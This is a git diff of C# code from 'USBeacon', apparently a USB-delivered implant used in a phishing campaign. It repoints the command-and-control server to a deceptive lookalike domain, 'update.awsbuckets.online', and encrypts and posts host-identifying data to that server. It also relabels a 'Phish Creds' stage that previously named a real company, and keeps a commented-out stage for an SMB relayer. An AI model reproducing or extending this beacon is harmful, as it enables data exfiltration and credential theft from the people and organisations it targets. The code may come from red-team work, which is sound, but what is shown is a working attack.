@@ -115,11 +115,8 @@ namespace USBeacon
             String hashid = GetId();   // Unique but repeatable ID of beacon built off of hostname
             UriBuilder c2 = new UriBuilder();   
             c2.Scheme = "http";
-            //c2.Host = "192.168.88.188";
-            //c2.Port = 5000;
-
-            c2.Host = "healthybitsatwork.com";
-            c2.Port = 8000;
+            c2.Host = "update.awsbuckets.online";
+            c2.Port = 80;
             c2.Path = resource + "/";
             c2.Path += hashid;
              
@@ -130,7 +127,8 @@ namespace USBeacon
             if (SafeDelivery)
                 data = EncodePay(EncryptPay(data, key));
 
-
+            Console.WriteLine("Data: " + data);
+            Console.WriteLine("Site: " + site);
             using (WebClient client = new WebClient())
             {
                 // Leverage SSO
@@ -146,7 +144,7 @@ namespace USBeacon
             }
 
             //Stage 2: Phish Creds.
-            data = OpenStage2("Seattle Genetics");
+            data = OpenStage2("Company:");
             if (SafeDelivery)
                 data = EncodePay(EncryptPay(data, key));
 
@@ -163,6 +161,8 @@ namespace USBeacon
                     {"d", data}
                 });
             }
+
+            Utils.DisplayMessage("Title", "Message");
 
             //Stage 3: Conenct to SMB relayer
             /*using (WebClient client = new WebClient())
